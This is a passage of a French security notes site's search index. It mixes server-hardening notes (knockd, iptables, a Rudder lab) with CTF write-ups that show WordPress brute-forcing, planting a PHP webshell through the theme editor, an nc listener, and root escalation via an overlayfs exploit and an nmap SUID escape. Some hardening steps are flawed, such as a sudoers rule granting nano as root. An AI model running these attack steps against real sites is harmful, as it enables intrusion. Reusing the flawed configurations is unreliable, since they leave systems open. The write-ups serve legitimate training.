SHA256:rMpoCaYPSfRqmOBFOJvEr5uLqxYjqYtRDgUoqUwH2nA (ED25519-256) [2019/07/11]  \n ~ keyline follows, please copy the *whole* line:  \n from=\"198.51.100.1/32\" ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILnY2NQTKsTDxgcaTE6vHVm9FIbud1rJcYQ/4xUyr+DK johndoe@bssh:1562861572  \n --------------------------------------------------------&lt;/selfListEgressKeys&gt;---\n</code></pre> <p>Rajouter la cl\u00e9 dans 'authorized_keys' chez le serveur de destination <code>echo \"from=\"198.51.100.1/32\" ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILnY2NQTKsTDxgcaTE6vHVm9FIbud1rJcYQ/4xUyr+DK johndoe@bssh:1562861572\" &gt;&gt; /root/.ssh/authorized_keys</code></p> <p>Ajouter l'acc\u00e8s dans le terminal du bastion </p> <pre><code> bssh(master)&gt; selfAddPersonalAccess --host 198.51.100.42 --port 22 --user root  \n ---the-bastion.example.org----------------------------the-bastion-2.99.99-rc9---  \n =&gt; adding private access to a server on your account  \n --------------------------------------------------------------------------------  \n ~ Testing connection to root@198.51.100.42, please wait...  \n Warning: Permanently added '198.51.100.42' (ECDSA) to the list of known hosts.  \n ~ Access to root@198.51.100.42:22 successfully added  \n -----------------------------------------------------&lt;/selfAddPersonalAccess&gt;---\n</code></pre> <p>V\u00e9rifier l'acc\u00e8s </p> <pre><code> bssh(master)&gt; `selfListAccesses`  \n ---the-bastion.example.org----------------------------the-bastion-2.99.99-rc9---  \n =&gt; your access list  \n --------------------------------------------------------------------------------  \n ~ Dear johndoe, you have access to the following servers:  \n | IP            | PORT| USER| ACCESS-BY| ADDED-BY| ADDED-AT  |  \n | ------------- | --- | --- | -------- | ------- | --------- |  \n | 198.51.100.42 | 22  | root| personal | johndoe | 2020-05-01|  \n -----------------------------------------------------\\&lt;/selfListAccesses&gt;---\n</code></pre>"},{"location":"Hardening_Etinzon_Nathan/#knockd","title":"Knockd","text":"<ul> <li>R\u00e9f\u00e9rences:<ul> <li>https://goteleport.com/blog/ssh-port-knocking/</li> </ul> </li> </ul>"},{"location":"Hardening_Etinzon_Nathan/#installation_1","title":"Installation","text":"<p><code>apt install knockd</code></p>"},{"location":"Hardening_Etinzon_Nathan/#configuration","title":"Configuration","text":"<p>/etc/knockd.conf</p> <pre><code> [options]  \n      UseSyslog\n\n [openSSH]  \n      sequence    = 7000,8000,9000  \n      seq_timeout = 5  \n      command     = /sbin/iptables -A INPUT -s %IP% -p tcp --dport 22 -j ACCEPT  \n      tcpflags    = syn\n\n [closeSSH]  \n      sequence    = 9000,8000,7000  \n      seq_timeout = 5  \n      command     = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT  \n      tcpflags    = syn\n</code></pre> <p>/etc/default/knockd </p> <pre><code> # control if we start knockd at init or not  \n # 1 = start  \n # anything else = don't start  \n # PLEASE EDIT /etc/knockd.conf BEFORE ENABLING  \n START_KNOCKD=1\n\n # command line options  \n KNOCKD_OPTS=\"-i ens33\"\n</code></pre> <p><code>systemctl start knockd</code> <code>systemctl enable knockd</code></p>"},{"location":"Hardening_Etinzon_Nathan/#configuration-iptables","title":"Configuration iptables","text":"<p>Via un script pour se simplifier la vie</p> <pre><code> # !/bin/bash\n\n # Delete current rules  \n iptables -F ; iptables -X\n\n # Don't f*ck up estabished connection  \n iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT  \n iptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\n\n # Authorize localhost port 22 input  \n iptables -t filter -i ens33 --src 127.0.0.1/32 -A INPUT -p TCP --dport 22 -j ACCEPT\n\n # Authorize port 22 output  \n iptables -t filter -A OUTPUT -p TCP --sport 22 -j ACCEPT\n\n # Authorize all port 80 traffic  \n iptables -t filter -A INPUT -p TCP --sport 80 -j ACCEPT  \n iptables -t filter -A OUTPUT -p TCP --sport 80 -j ACCEPT\n\n # Authorize all port 53 traffic  \n iptables -t filter -A INPUT -p TCP --sport 53 -j ACCEPT  \n iptables -t filter -A OUTPUT -p TCP --sport 53 -j ACCEPT\n\n # Authorize all port 443 traffic  \n iptables -t filter -A INPUT -p TCP --sport 443 -j ACCEPT  \n iptables -t filter -A OUTPUT -p TCP --sport 443 -j ACCEPT\n\n # Authorize ICMP traffic  \n iptables -t filter -A INPUT -p ICMP -j ACCEPT  \n iptables -t filter -A OUTPUT -p ICMP -j ACCEPT\n\n # Drop all port 44 connection  \n iptables -A INPUT -p tcp --dport 44 -j REJECT\n\n # Drop all  \n iptables -t filter -A INPUT -j DROP  \n iptables -t filter -A OUTPUT -j DROP\n\n # List new rules  \n iptables -L\n</code></pre>"},{"location":"Hardening_Etinzon_Nathan/#script-client-knockd","title":"Script Client Knockd","text":"<p>Script pour permettre d'envoyer la s\u00e9quence d'ouverture knockd, lancer la session ssh puis d'envoyer le s\u00e9quence de fermeture knockd (cela \u00e9viter d'oublier de fermer le port apr\u00e8s la session ssh)</p> <pre><code> #!/bin/bash\n\n # Target IP address  \n TARGET_IP=\"192.168.157.129\"\n\n # User  \n USER=\"natha\"\n\n # Port  \n PORT=\"44\"\n\n # Private key  \n PRIV_KEY=\"/home/user/tp_hard/tp_hard\"\n\n # Port knocking sequence to open SSH  \n OPEN_SEQ=(7000 8000 9000)\n\n # Port knocking sequence to close SSH (reverse order)  \n CLOSE_SEQ=(9000 8000 7000)\n\n # Knocking sequence sending function  \n knock_sequence() {  \n      local ip=\\$1  \n      shift  \n      local ports=(\"$@\")\n\n      for port in \"\\${ports[@]}\"; do  \n           knock -v \\$ip $port  \n           sleep 1  \n           done \n      }\n\n # Open SSH  \n echo \"Sending sequence to open SSH...\"  \n knock_sequence \\$TARGET_IP \"${OPEN_SEQ[@]}\"\n\n # Open SSH connection  \n echo \"SSH connection to $TARGET_IP\"  \n ssh $USER@$TARGET_IP -p $PORT -i $PRIV_KEY\n\n # Schedule closing sequence   \n echo \"Sending sequence to close SSH...\"  \n #at now + 1 minute  \n knock_sequence \\$TARGET_IP ${CLOSE_SEQ[@]}\n\n echo \"Closing sequence sceduled.\"\n</code></pre>"},{"location":"ITIL_Etinzon_Nathan/","title":"D\u00e9ploiement de Rudder","text":""},{"location":"ITIL_Etinzon_Nathan/#contexte","title":"Contexte","text":"<p>Vous \u00eates un administrateur syst\u00e8me dans une entreprise qui souhaite am\u00e9liorer sa gestion des services informatiques en adoptant les principes ITIL. Votre mission consiste \u00e0 configurer et \u00e0 utiliser Rudder pour automatiser la gestion des configurations, renforcer la s\u00e9curit\u00e9, installer des applications et g\u00e9rer les utilisateurs.</p>"},{"location":"ITIL_Etinzon_Nathan/#1ere-etape-installation-et-configuration-du-serveur-rudder","title":"1\u00e8re \u00e9tape : Installation et Configuration du Serveur Rudder","text":""},{"location":"ITIL_Etinzon_Nathan/#11-installation","title":"1.1 Installation","text":"<p>Installez Rudder Server sur la machine virtuelle serveur d\u00e9di\u00e9e</p> <p>sudo wget --quiet -O /etc/apt/trusted.gpg.d/rudder_apt_key.gpg \"https://repository.rudder.io/apt/rudder_apt_key.gpg\"</p> <p>sudo nano /etc/apt/sources.list.d/rudder.list</p> <p>Ajouter la ligne : deb [trusted=yes] http://repository.rudder.io/apt/8.0/ jammy main</p> <p>sudo apt-get update</p> <p>sudo apt-get install rudder-server</p> <p>sudo apt-get upgrade</p> <p>rudder server create-user -u n.etinzon</p>"},{"location":"ITIL_Etinzon_Nathan/#12-validation","title":"1.2 Validation","text":"<p>Connectez-vous \u00e0 l'interface web de Rudder, v\u00e9rifiez l'\u00e9tat du serveur et assurez-vous qu'il est pr\u00eat \u00e0 communiquer avec les agents.</p> <p></p>"},{"location":"ITIL_Etinzon_Nathan/#2eme-etape-installation-et-configuration-dun-agent-rudder","title":"2\u00e8me \u00e9tape : Installation et Configuration d'un Agent Rudder","text":""},{"location":"ITIL_Etinzon_Nathan/#21-machine-client-linux","title":"2.1 Machine client Linux","text":"<p>Installez l'agent Rudder sur la machine cliente Linux, et configurez-la pour qu'elle communique avec le serveur.</p> <p>sudo wget --quiet -O /etc/apt/trusted.gpg.d/rudder_apt_key.gpg \"https://repository.rudder.io/apt/rudder_apt_key.gpg\"</p> <p>sudo nano /etc/apt/sources.list.d/rudder.list</p> <p>Ajouter la ligne : deb http://repository.rudder.io/apt/8.0/ jammy main</p> <p>sudo apt-get install rudder-agent</p> <p>rudder agent policy-server 163.172.163.218</p> <p>sudo rudder agent inventory</p>"},{"location":"ITIL_Etinzon_Nathan/#22-validation","title":"2.2 Validation","text":"<p>Assurez-vous que l'agent apparaisse dans l'interface web de Rudder et soit autoris\u00e9e.</p> <p></p>"},{"location":"ITIL_Etinzon_Nathan/#3eme-etape-renforcement-des-configurations-systemes","title":"3\u00e8me \u00e9tape : Renforcement des Configurations Syst\u00e8mes","text":""},{"location":"ITIL_Etinzon_Nathan/#31-technique-de-securite","title":"3.1 Technique de S\u00e9curit\u00e9","text":"<p>Sur les deux machines :</p> <p>Cr\u00e9ation de comptes : S'assurer que les compte,s \"user01\" et \"user02\" sont existants. User01 a un shell en \"bash\", user02 en \"nologin\". Les homes seront dans \"/home/nom_user\"</p> <p>sudo useradd -m -s /usr/bin/bash user01 sudo useradd -m -s /usr/bin/nologin user02</p> <p></p> <p>D\u00e9sactivation des comptes : S'assurer que le compte \"user02\" est d\u00e9sactiv\u00e9.</p> <p>sudo usermod -L user02</p> <p>Restriction des permissions root : user01\" doit avoir le droit d'utiliser sudo, uniquement pour consulter les log dans \"/var/log/syslog\".</p> <p>sudo nano /etc/sudoers Ajouter les lignes :</p> <p>#Allow user1 to view /var/log/syslog user1   ALL=(root) /bin/nano var/log/syslog/*</p> <p>Configuration du Pare-feu : Autoriser uniquement les ports 22 (SSH), 80 (HTTP), 5309 et 443 (HTTPS). Bloquer tous les autres ports.</p> <p>sudo ufw allow 22 sudo ufw allow 80 sudo ufw allow 5309 sudo ufw allow 443 sudo ufw enable</p> <p></p> <p>Mise \u00e0 jour des Packages : Appliquer toutes les mises \u00e0 jour de s\u00e9curit\u00e9 disponibles.</p> <p>sudo apt-get update sudo apt-get upgrade</p> <p>Installation de Packages : Installer \"fail2ban\" et \"apache2\" et s'assurer du d\u00e9marrage des services.</p> <p>sudo apt-get install apache2 sudo apt-get install fail2ban</p> <p></p> <p>D\u00e9ploiement de fichiers : D\u00e9ployer une page web contenant l'IP du serveur.</p> <p></p> <p>Renforcer la configuration SSH, mais sans rester dehors.</p> <p>G\u00e9n\u00e9rer une paire de cl\u00e9 sur la machine locale</p> <p>ssh-keygen cat ~/.ssh/id_rsa.pub Copier le contenu Sur l'h\u00f4te distant, coller la cl\u00e9 dans /home/n.etinzon/.ssh/authorized_keys Passer le param\u00e8tre PasswordAuthentification yes =&gt; PasswordAuthentification no dans /etc/ssh/ssh_config sudo nano /etc/ssh/ssh_config</p> <p></p>"},{"location":"ITIL_Etinzon_Nathan/#4eme-etape-audit-et-conformite","title":"4\u00e8me \u00e9tape : Audit et Conformit\u00e9","text":""},{"location":"ITIL_Etinzon_Nathan/#41-audit-des-configurations","title":"4.1 Audit des Configurations","text":"<p>Utilisez les fonctionnalit\u00e9s d'audit de Rudder pour v\u00e9rifier la conformit\u00e9 des machines avec les configurations souhait\u00e9es.</p> <p></p>"},{"location":"ITIL_Etinzon_Nathan/#42-rapport-de-conformite","title":"4.2 Rapport de Conformit\u00e9","text":"<p>G\u00e9n\u00e9rez un rapport de conformit\u00e9 \u00e0 partir de l'interface web de Rudder et analysez les r\u00e9sultats.</p> <p>Possibilit\u00e9 d'ajouter d'un module pour avoir un pdf.</p>"},{"location":"ITIL_Etinzon_Nathan/#5eme-etape-resolution-de-problemes-et-scenarios-pratiques","title":"5\u00e8me \u00e9tape : R\u00e9solution de Probl\u00e8mes et Sc\u00e9narios Pratiques","text":""},{"location":"ITIL_Etinzon_Nathan/#51-diagnostic","title":"5.1 Diagnostic","text":"<p>Diagnostiquez et r\u00e9solvez un probl\u00e8me de configuration sur l'une des machines, simul\u00e9 ou r\u00e9el.</p> <p></p>"},{"location":"ITIL_Etinzon_Nathan/#52-scenario-pratique","title":"5.2 Sc\u00e9nario Pratique","text":"<p>R\u00e9pondez \u00e0 une demande de changement fictive, en modifiant les configurations sur les machines via Rudder.</p> <p></p> <p></p> <p>R\u00e9sultat :</p> <p></p>"},{"location":"ITIL_Etinzon_Nathan/#6eme-etape-integration-avec-itil-amelioration-continue-et-recommandations","title":"6\u00e8me \u00e9tape : Int\u00e9gration avec ITIL, Am\u00e9lioration Continue et Recommandations","text":""},{"location":"ITIL_Etinzon_Nathan/#61-alignement-itil-analyse-et-recommandations","title":"6.1 Alignement ITIL, Analyse et Recommandations","text":"<p>Documentez comment les actions r\u00e9alis\u00e9es s'alignent avec les processus ITIL, en particulier la Gestion des Services et la Gestion des Configurations. Identifiez les domaines d'am\u00e9lioration et les recommandations dans la mani\u00e8re dont Rudder est utilis\u00e9 et proposez des actions concr\u00e8tes.</p> <p></p>"},{"location":"Internal_Write-Up/","title":"Internal Write-up","text":""},{"location":"Internal_Write-Up/#enumeration","title":"Enum\u00e9ration","text":""},{"location":"Internal_Write-Up/#nmap","title":"Nmap","text":""},{"location":"Internal_Write-Up/#commande","title":"Commande","text":"<p><code>nmap -T4 -sC -sV -Pn -p- 10.10.33.91</code></p>"},{"location":"Internal_Write-Up/#informations","title":"Informations","text":"<p>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey:  |   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA) |   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA) |_  256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (EdDSA) 80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works</p>"},{"location":"Internal_Write-Up/#gobuster","title":"Gobuster","text":""},{"location":"Internal_Write-Up/#commandes","title":"Commandes","text":"<p><code>gobuster dir -u http://10.10.33.91/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100</code> <code>gobuster dir -u http://10.10.33.91/wordpress -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100</code> <code>gobuster dir -u http://10.10.33.91/phpmyadmin -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100</code> <code>gobuster dir -u http://10.10.33.91/blog -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100</code></p>"},{"location":"Internal_Write-Up/#informations_1","title":"Informations","text":"<p>/wordpress (Status: 301)     /wp-content (Status: 301)     /wp-includes (Status: 301)     /wp-admin (Status: 301)     /wp-login.php  </p> <p>/javascript (Status: 301)  </p> <p>/blog (Status: 301)     /wp-content (Status: 301)     /wp-includes (Status: 301)     /wp-admin (Status: 301)     /wp-login.php  </p> <p>/phpmyadmin (Status: 301)     /themes (Status: 301)     /templates (Status: 403)     /doc (Status: 301)     /js (Status: 301)     /libraries (Status: 403)     /setup (Status: 401)     /sql (Status: 301)     /locale (Status: 301)  </p> <p>/server-status (Status: 403)  </p>"},{"location":"Internal_Write-Up/#wappalizer","title":"Wappalizer","text":""},{"location":"Internal_Write-Up/#informations_2","title":"Informations","text":"<p>Apache/2.4.29 WordPress/5.4.2 Theme : Twenty Seventeen phpMyAdmin Google Font API RSS CodeMirror Apache HTTP Server PHP MySQL jQuery jQuery UI jQuery Migrate  </p>"},{"location":"Internal_Write-Up/#wpscan","title":"WPScan","text":""},{"location":"Internal_Write-Up/#commande_1","title":"Commande","text":"<p><code>wpscan -h http://10.10.33.91/wordpress</code></p>"},{"location":"Internal_Write-Up/#informations_3","title":"Informations","text":"<p>[+] XML-RPC seems to be enabled: http://10.10.33.91/wordpress/xmlrpc.php  | Found By: Direct Access (Aggressive Detection)  | Confidence: 100%  | References:  |  - http://codex.wordpress.org/XML-RPC_Pingback_API  |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner  |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos  |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login   &lt;= Succ\u00e8s  |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access  </p> <p>[+] WordPress readme found: http://10.10.33.91/wordpress/readme.html  | Found By: Direct Access (Aggressive Detection)  | Confidence: 100%  </p> <p>[+] The external WP-Cron seems to be enabled: http://10.10.33.91/wordpress/wp-cron.php  | Found By: Direct Access (Aggressive Detection)  | Confidence: 60%  | References:  |  - https://www.iplocation.net/defend-wordpress-from-ddos  |  - https://github.com/wpscanteam/wpscan/issues/1299  </p> <p>[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).  | Found By: Emoji Settings (Passive Detection)  |  - http://10.10.33.91/wordpress/, Match: 'wp-includes\\/js\\/wp-emoji-release.min.js?ver=5.4.2'  | Confirmed By: Meta Generator (Passive Detection)  |  - http://10.10.33.91/wordpress/, Match: 'WordPress 5.4.2'  </p>"},{"location":"Internal_Write-Up/#acces-initial","title":"Acc\u00e8s initial","text":"<ul> <li>Ajouter internal.thm dans /etc/host</li> <li>Acc\u00e8der \u00e0 http://10.10.33.91/wordpress/wp-login.php  </li> <li>Rentrer les identifiants \"admin:my2boys\" (r\u00e9cup\u00e9rer via metasploit auxiliary/scanner/http/wordpress_xmlrpc_login)  </li> <li>Naviguer vers \u201cAppearance &gt; Theme Editor &gt; 404.php\"</li> <li>Remplacer le code par un webshell php</li> <li>Lancer un listener (<code>nc -lvnp 4444</code>)</li> <li>Acc\u00e8der \u00e0 la page http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php</li> </ul>"},{"location":"Internal_Write-Up/#escalade-de-privilege","title":"Escalade de privil\u00e8ge","text":"<ul> <li>Upgrader du webshell vers un meterpreter</li> <li> <p>Executer post(multi/recon/local_exploit_suggester) R\u00e9sultat : </p> <ol> <li>exploit/linux/local/cve_2021_3493_overlayfs                         Yes                      The target appears to be vulnerable.  </li> <li>exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec                 Yes                      The target is vulnerable.  </li> <li>exploit/linux/local/cve_2022_0995_watch_queue                        Yes                      The target appears to be vulnerable.  </li> <li>exploit/linux/local/docker_cgroup_escape                            Yes                      The target is vulnerable. IF host OS is Ubuntu, kernel version 4.15.0-112-generic is vulnerable  </li> <li>exploit/linux/local/nested_namespace_idmap_limit_priv_esc           Yes                      The target appears to be vulnerable.  </li> <li>exploit/linux/local/pkexec                                          Yes                      The service is running, but could not be validated.  </li> <li>exploit/linux/local/ptrace_traceme_pkexec_helper                    Yes                      The target appears to be vulnerable.  </li> <li>exploit/linux/local/su_login                                        Yes                      The target appears to be vulnerable.  </li> <li>exploit/linux/local/sudo_baron_samedit                              Yes                      The target appears to be vulnerable. sudo 1.8.21.2 is a vulnerable build.  </li> <li>exploit/linux/local/sudoedit_bypass_priv_esc                        Yes                      The target appears to be vulnerable. Sudo 1.8.21p2.pre.3ubuntu1.2 is vulnerable, but unable to determine editable file. OS can NOT be exploited by this module  </li> </ol> </li> <li> <p>Test exploit/linux/local/cve_2021_3493_overlayfs</p> </li> <li>BINGO Du premier coup!</li> <li>On a un shell root, on fait ce que l'on veut</li> </ul>"},{"location":"Mr-Robot_Write-Up/","title":"Mr Robot Write-up","text":""},{"location":"Mr-Robot_Write-Up/#reconnaissance","title":"Reconnaissance","text":""},{"location":"Mr-Robot_Write-Up/#robotstxt","title":"robots.txt","text":"<p>User-agent: * fsocity.dic &lt;= Wordlist qui nous servira key-1-of-3.txt &lt;= Premier flag</p>"},{"location":"Mr-Robot_Write-Up/#enumeration","title":"Enum\u00e9ration","text":""},{"location":"Mr-Robot_Write-Up/#nmap","title":"Nmap","text":""},{"location":"Mr-Robot_Write-Up/#commande","title":"Commande","text":"<p><code>nmap -T4 -sC -sV -Pn -p- 10.10.37.192</code></p>"},{"location":"Mr-Robot_Write-Up/#informations","title":"Informations","text":"<p>PORT    STATE  SERVICE  VERSION 22/tcp  closed ssh 80/tcp  open   http     Apache httpd |_http-server-header: Apache |_http-title: Site doesn't have a title (text/html). 443/tcp open   ssl/http Apache httpd |_http-server-header: Apache |_http-title: Site doesn't have a title (text/html). | ssl-cert: Subject: commonName=www.example.com | Not valid before: 2015-09-16T10:45:03 |_Not valid after:  2025-09-13T10:45:03 MAC Address: 02:9D:12:C9:C2:F7 (Unknown)  </p>"},{"location":"Mr-Robot_Write-Up/#gobuster","title":"Gobuster","text":""},{"location":"Mr-Robot_Write-Up/#commandes","title":"Commandes","text":"<p><code>gobuster dir -u http://10.10.37.192 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50</code></p>"},{"location":"Mr-Robot_Write-Up/#informations_1","title":"Informations","text":"<p>/blog (Status: 301) /images (Status: 301) /sitemap (Status: 200) /rss (Status: 301) /login (Status: 302) /video (Status: 301) /0 (Status: 301) /feed (Status: 301) /image (Status: 301) /atom (Status: 301) /wp-content (Status: 301) /admin (Status: 301) /audio (Status: 301) /intro (Status: 200) /wp-login (Status: 200) /css (Status: 301) /rss2 (Status: 301) /license (Status: 200) /wp-includes (Status: 301) /js (Status: 301) /Image (Status: 301) /rdf (Status: 301) /page1 (Status: 301) /readme (Status: 200) /robots (Status: 200)  </p>"},{"location":"Mr-Robot_Write-Up/#wappalizer","title":"Wappalizer","text":""},{"location":"Mr-Robot_Write-Up/#informations_2","title":"Informations","text":"<p>WordPress 4.3.1 Adobe Analytics Google Font API Apache HTTP Server Google PageSpeed 1.9.32.3 PHP5.5.29 MySQL jQuery 1.11.3 Modernizr 2.8.3 jQuery Migrate Google PageSpeed  </p>"},{"location":"Mr-Robot_Write-Up/#wpscan","title":"WPScan","text":""},{"location":"Mr-Robot_Write-Up/#commande_1","title":"Commande","text":"<p><code>wpscan -h http://10.10.37.192/wordpress</code></p>"},{"location":"Mr-Robot_Write-Up/#informations_3","title":"Informations","text":"<p>[+] Headers  | Interesting Entries:  |  - Server: Apache  |  - X-Mod-Pagespeed: 1.9.32.3-4523  | Found By: Headers (Passive Detection)  | Confidence: 100%  </p> <p>[+] robots.txt found: http://10.10.37.192/robots.txt  | Found By: Robots Txt (Aggressive Detection)  | Confidence: 100%  </p> <p>[+] XML-RPC seems to be enabled: http://10.10.37.192/xmlrpc.php  | Found By: Direct Access (Aggressive Detection)  | Confidence: 100%  | References:  |  - http://codex.wordpress.org/XML-RPC_Pingback_API  |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner  |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos  |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login  |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access  </p> <p>[+] The external WP-Cron seems to be enabled: http://10.10.37.192/wp-cron.php  | Found By: Direct Access (Aggressive Detection)  | Confidence: 60%  | References:  |  - https://www.iplocation.net/defend-wordpress-from-ddos  |  - https://github.com/wpscanteam/wpscan/issues/1299  </p> <p>[+] WordPress version 4.3.1 identified (Insecure, released on 2015-09-15).  | Found By: Emoji Settings (Passive Detection)  |  - http://10.10.37.192/d40738b.html, Match: 'wp-includes\\/js\\/wp-emoji-release.min.js?ver=4.3.1'  | Confirmed By: Meta Generator (Passive Detection)  |  - http://10.10.37.192/d40738b.html, Match: 'WordPress 4.3.1'  </p> <p>[+] WordPress theme in use: twentyfifteen  | Location: http://10.10.37.192/wp-content/themes/twentyfifteen/  | Last Updated: 2021-03-09T00:00:00.000Z  | Readme: http://10.10.37.192/wp-content/themes/twentyfifteen/readme.txt  | [!] The version is out of date, the latest version is 2.9  | Style URL: http://10.10.37.192/wp-content/themes/twentyfifteen/style.css?ver=4.3.1  | Style Name: Twenty Fifteen  | Style URI: https://wordpress.org/themes/twentyfifteen/  | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...  | Author: the WordPress team  | Author URI: https://wordpress.org/  |  | Found By: Css Style In 404 Page (Passive Detection)  |  | Version: 1.3 (80% confidence)  | Found By: Style (Passive Detection)  |  - http://10.10.37.192/wp-content/themes/twentyfifteen/style.css?ver=4.3.1, Match: 'Version: 1.3'  </p>"},{"location":"Mr-Robot_Write-Up/#brute-force","title":"Brute-force","text":""},{"location":"Mr-Robot_Write-Up/#sqlmap","title":"SQLMap","text":""},{"location":"Mr-Robot_Write-Up/#commande_2","title":"Commande","text":"<p><code>sqlmap -r post_req.txt --current-user</code></p>"},{"location":"Mr-Robot_Write-Up/#informations_4","title":"Informations","text":"<p>Pas injectable :(</p>"},{"location":"Mr-Robot_Write-Up/#hydra","title":"Hydra","text":""},{"location":"Mr-Robot_Write-Up/#commande_3","title":"Commande","text":"<p><code>hydra -L /tmp/fsocity_uniq.dic 10.10.37.192 -p X http-post-form \"/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;Log+In:F=Invalid username.\"</code> <code>hydra -l elliot -P /tmp/fsocity_uniq.dic 10.10.37.192 http-post-form \"/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;Log+In:F=is incorrect.\"</code></p>"},{"location":"Mr-Robot_Write-Up/#informations_5","title":"Informations","text":"<p>La wordlist comprend beaucoup de doublons, on le voit avec <code>sort fsocity.dic | uniq | wc -l</code> =&gt; 11452 au lieu de ~800000 On enleve les doublons avec la commande suivante : <code>sort fsocity.dic | uniq &gt; fsocity_uniq.dic</code> </p> <p>[80][http-post-form] host: 10.10.37.192   login: elliot   password: X [80][http-post-form] host: 10.10.37.192   login: Elliot   password: X [80][http-post-form] host: 10.10.37.192   login: ELLIOT   password: X  </p> <p>[80][http-post-form] host: 10.10.37.192   login: elliot   password: ER28-0652</p>"},{"location":"Mr-Robot_Write-Up/#acces-initial","title":"Acc\u00e8s initial","text":""},{"location":"Mr-Robot_Write-Up/#identifiant-dans-homerobotpasswordraw-md5","title":"Identifiant dans /home/robot/password.raw-md5","text":"<p>On crack et on trouve : robot:abcdefghijklmnopqrstuvwxyz</p>"},{"location":"Mr-Robot_Write-Up/#escalade-de-privileges","title":"Escalade de privil\u00e8ges","text":"<p>SUID : <code>find / -perm -4000 -type f 2&gt;/dev/null</code> =&gt; /usr/local/bin/nmap <code>nmap --interactive</code> <code>!cat /root/key-3-of-3.txt</code></p>"},{"location":"Mr-Robot_Write-Up/#flags","title":"Flags","text":"<ul> <li>Flag 1 : <code>073403c8a58a1f80d943455fb30724b9</code> </li> <li>Flag 2 : <code>822c73956184f694993bede3eb39f959</code> </li> <li>Flag 3 : <code>04787ddef27c3dee1ee161b21670b4e4</code> </li> </ul>"},{"location":"Palo-Alto/","title":"Palo-Alto concise documentation","text":""},{"location":"Palo-Alto/#installation","title":"Installation","text":"<ul> <li> <p>Device</p> <ul> <li>Setup<ul> <li>Interfaces</li> <li>Services (DNS)  </li> </ul> </li> <li>Licences</li> <li>Dynamic updates</li> </ul> </li> <li> <p>Network</p> <ul> <li>Interfaces WAN/LAN (don't forget to add the interfaces on the vm in the hypervisor)</li> <li>Virtual routers (default gateway)</li> </ul> </li> </ul>"},{"location":"Palo-Alto/#optional","title":"Optional","text":"<ul> <li>Network<ul> <li>Interface Management (to ping interfaces)</li> </ul> </li> </ul>"},{"location":"Palo-Alto/#url-filtering-antivirus","title":"URL Filtering &amp; Antivirus","text":"<ul> <li> <p>Device</p> <ul> <li>Certificates =&gt; Generate (Forward Trust Certificate)</li> <li>Certificate Profile</li> <li>Export certificate and install on client(s)</li> </ul> </li> <li> <p>Objects</p> <ul> <li>Antivirus</li> </ul> </li> <li> <p>Policies</p> <ul> <li>Decryption</li> <li>Security<ul> <li>HTTP rule =&gt; Action =&gt; Profile setting =&gt; Antivirus profile</li> </ul> </li> </ul> </li> <li> <p>Objects</p> <ul> <li>URL categories (for custom URL filtering)</li> <li>URL Filtering</li> </ul> </li> <li> <p>Policies</p> <ul> <li>Security<ul> <li>SSL rule =&gt; Action =&gt; Profile setting =&gt; URL profile</li> </ul> </li> </ul> </li> </ul>"},{"location":"Palo-Alto/#ipsec-tunnel-site-to-site","title":"IPSec tunnel site to site","text":"<ul> <li> <p>Network</p> <ul> <li>Interfaces tunnel</li> <li>IKE crypto</li> <li>IKE Gateway</li> <li>IPSec crypto</li> <li>IPSec tunnel (check Proxys)</li> <li>Virtual router (static route)</li> </ul> </li> <li> <p>Policies</p> <ul> <li>Security =&gt; IPSec/IKE rules</li> </ul> </li> </ul>"},{"location":"Palo-Alto/#captive-portal","title":"Captive Portal","text":"<ul> <li> <p>Network</p> <ul> <li>Zones =&gt; Select zone =&gt; Enable user identification</li> <li>Interface =&gt; Select interface =&gt; Advanced Tab =&gt; Create Management interface profile</li> </ul> </li> <li> <p>Device</p> <ul> <li>Users =&gt; Add User/User group</li> <li>Certificates =&gt; Generate (Forward Trust Certificate)</li> <li>SSL/TLS Service Profile</li> <li>Authentification profile</li> <li>User identification =&gt; Captive portal </li> </ul> </li> <li> <p>Policies</p> <ul> <li>Authentification profile</li> <li>Decryption</li> <li>Security =&gt; Add DNS/Captive portal rule</li> </ul> </li> <li> <p>Device</p> <ul> <li>Certificates =&gt; Export certificate and install on client(s)</li> </ul> </li> </ul>"},{"location":"PenTest_Cheat_Sheet/","title":"PENTEST CHEAT SHEET","text":""},{"location":"PenTest_Cheat_Sheet/#cheat-sheet-ultime","title":"Cheat Sheet ultime","text":"<p>InternalAllTheThings 